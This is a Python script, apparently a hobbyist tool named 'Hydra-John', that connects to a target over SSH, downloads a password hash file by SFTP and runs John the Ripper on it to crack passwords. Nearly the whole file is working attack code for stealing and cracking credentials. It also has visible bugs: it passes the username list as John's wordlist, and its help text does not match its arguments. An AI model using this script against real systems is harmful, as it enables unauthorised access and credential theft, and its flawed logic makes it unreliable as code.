#!/usr/bin/python3
import argparse
import subprocess
import paramiko
import socket

print("""
|-------------------------------------------------------------------------------------------------------------------|
|                  ##   ##  ##  ##   #####    ######     ##                 ####   #####   ##   ##  ##   ##         |
|                  ##   ##  ##  ##    ## ##    ##  ##   ####                 ##   ##   ##  ##   ##  ###  ##         |
|                  ##   ##  ##  ##    ##  ##   ##  ##  ##  ##                ##   ##   ##  ##   ##  #### ##         |
|                  #######   ####     ##  ##   #####   ##  ##   ######       ##   ##   ##  #######  ## ####         |
|                  ##   ##    ##      ##  ##   ## ##   ######            ##  ##   ##   ##  ##   ##  ##  ###         |
|                  ##   ##    ##      ## ##    ##  ##  ##  ##            ##  ##   ##   ##  ##   ##  ##   ##         |
|                  ##   ##   ####    #####    #### ##  ##  ##             ####     #####   ##   ##  ##   ##         |
| Hydra john devs:                                                                                                  |
| RussianDude122: Programmer                                                                                        |
| AmericanBoi: Contributer                                                                                          |
| Sojoyork: Contributer                                                                                             |
|-------------------------------------------------------------------------------------------------------------------|


""")

def display_help():
    help_text = """
    Hydra-John: A hybrid tool combining John-the-Ripper and Hydra functionalities.

    Usage:
      hydra-john -u <username or username wordlist> -ptph <path to the password hash>

    Options:
      -u, --user       Specify a single username or a wordlist containing usernames.
      -ptph, --path    Specify the path to the password hash on the target system.
      -help            Display this help message.
    """
    print(help_text)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Hydra-John: A hybrid tool combining John-the-Ripper and Hydra functionalities.")
    parser.add_argument('-u', '--user', required=True, help='Specify a single username or a wordlist containing usernames.')
    parser.add_argument('-ptph', '--path', required=True, help='Specify the path to the password hash on the target system.')
    parser.add_argument('-host', '--host', required=True, help='Specify the target system hostname or IP address.')
    parser.add_argument('-port', '--port', type=int, default=22, help='Specify the SSH port of the target system.')
    parser.add_argument('-tuser', '--tuser', required=True, help='Specify the SSH username for the target system.')
    parser.add_argument('-tpass', '--tpass', required=True, help='Specify the SSH password for the target system.')
    parser.add_argument('-credits', action='store_true', help='Display credits for the tool.')
    args = parser.parse_args()
    return args

def display_credits():
    credits_text = """
    Credits:
  If this DID work then it ius broken lol
    """
    print(credits_text)

def is_target_online(host, port):
    try:
        socket.create_connection((host, port), timeout=5)
        return True
    except Exception as e:
        print(f"Target system is offline: {e}")
        return False

def connect_to_target(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
        return ssh
    except Exception as e:
        print(f"Failed to connect to target: {e}")
        return None

def retrieve_password_hash(ssh, hash_path):
    try:
        sftp = ssh.open_sftp()
        sftp.get(hash_path, 'password_hash.txt')
        sftp.close()
        return 'password_hash.txt'
    except Exception as e:
        print(f"Failed to retrieve password hash: {e}")
        return None

def crack_password(hash_file, username_file):
    subprocess.run(['john', '--wordlist=' + username_file, hash_file])

def main():
    args = parse_arguments()
    user = args.user
    hash_path = args.path
    target_host = args.host
    target_port = args.port
    target_username = args.tuser
    target_password = args.tpass

    if is_target_online(target_host, target_port):
        ssh = connect_to_target(target_host, target_port, target_username, target_password)
        if ssh:
            hash_file = retrieve_password_hash(ssh, hash_path)
            if hash_file:
                crack_password(hash_file, user)
            ssh.close()
    else:
        print("Target system is offline. Exiting.")

if __name__ == "__main__":
    main()
